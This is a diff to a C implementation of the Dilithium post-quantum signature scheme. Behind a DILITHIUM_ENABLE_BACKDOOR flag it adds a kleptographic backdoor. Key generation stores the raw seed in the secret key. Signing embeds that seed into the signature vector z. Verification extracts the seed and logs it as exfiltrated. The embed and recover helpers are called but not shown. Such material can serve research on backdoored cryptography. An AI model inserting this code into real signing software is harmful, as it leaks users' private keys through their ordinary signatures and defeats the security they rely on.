@@ -30,6 +30,16 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
 
   /* Get randomness for rho, rhoprime and key */
   randombytes(seedbuf, SEEDBYTES);
+  
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  pqcrystals_dilithium_status_print_seed("KEYGEN", seedbuf);
+  
+  // ! Backdoor requirement
+  // Keep the original seed before it is processed by shake256
+  uint8_t hidden_seed[SEEDBYTES];
+  memcpy(hidden_seed, seedbuf, SEEDBYTES);
+#endif
+
   seedbuf[SEEDBYTES+0] = K;
   seedbuf[SEEDBYTES+1] = L;
   shake256(seedbuf, 2*SEEDBYTES + CRHBYTES, seedbuf, SEEDBYTES+2);
@@ -61,7 +71,17 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
 
   /* Compute H(rho, t1) and write secret key */
   shake256(tr, TRBYTES, pk, CRYPTO_PUBLICKEYBYTES);
+  
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  (void)key;
+
+  // ! Backdoor requirement
+  // hidden_seed and key have the same size, so we can reuse the 'key' variable
+  // to store the real key derived from the hidden seed
+  pack_sk(sk, rho, tr, hidden_seed, &t0, &s1, &s2);
+#else
   pack_sk(sk, rho, tr, key, &t0, &s1, &s2);
+#endif
 
   return 0;
 }
@@ -106,6 +126,26 @@ int crypto_sign_signature_internal(uint8_t *sig,
   mu = key + SEEDBYTES;
   rhoprime = mu + CRHBYTES;
   unpack_sk(rho, tr, key, &t0, &s1, &s2, sk);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // ! Backdoor requirement
+  const uint8_t *hidden_seed = key;
+  uint8_t real_key[SEEDBYTES];
+
+  pqcrystals_dilithium_status_print_seed("SIGN", hidden_seed);
+  
+  // ! Backdoor requirement
+  /* Re-compute the real key: shake256(hidden_seed || K || L) */
+  uint8_t temp_seedbuf[2*SEEDBYTES + CRHBYTES];
+  memcpy(temp_seedbuf, hidden_seed, SEEDBYTES);
+  temp_seedbuf[SEEDBYTES+0] = K;
+  temp_seedbuf[SEEDBYTES+1] = L;
+  shake256(temp_seedbuf, 2*SEEDBYTES + CRHBYTES, temp_seedbuf, SEEDBYTES+2);
+  /* The real key is at offset SEEDBYTES + CRHBYTES in the squeezed output */
+  memcpy(real_key, temp_seedbuf + SEEDBYTES + CRHBYTES, SEEDBYTES);
+  /* Point 'key' to the real key for the rest of the function */
+  key = real_key;
+#endif
 
   /* Compute mu = CRH(tr, pre, msg) */
   shake256_init(&state);
@@ -158,6 +198,12 @@ rej:
   polyvecl_invntt_tomont(&z);
   polyvecl_add(&z, &z, &y);
   polyvecl_reduce(&z);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // ! Backdoor application
+  pqcrystals_dilithium_backdoor_embed(&z, hidden_seed);
+#endif
+
   if(polyvecl_chknorm(&z, GAMMA1 - BETA))
     goto rej;
 
@@ -185,6 +231,7 @@ rej:
   /* Write signature */
   pack_sig(sig, sig, &z, &h);
   *siglen = CRYPTO_BYTES;
+
   return 0;
 }
 
@@ -326,6 +373,16 @@ int crypto_sign_verify_internal(const uint8_t *sig,
   /* Matrix-vector multiplication; compute Az - c2^dt1 */
   poly_challenge(&cp, c);
   polyvec_matrix_expand(mat, rho);
+ 
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  uint8_t extracted_seed[SEEDBYTES];
+  pqcrystals_dilithium_backdoor_recover(&z, extracted_seed);
+
+  if(pqcrystals_dilithium_backdoor_restore(&z, extracted_seed, mu, &cp) == 0) {
+    // Restore success: z is now clean. Log the exfiltrated seed.
+    pqcrystals_dilithium_status_print_seed("RECOVER", extracted_seed);
+  }
+#endif
 
   polyvecl_ntt(&z);
   polyvec_matrix_pointwise_montgomery(&w1, mat, &z);
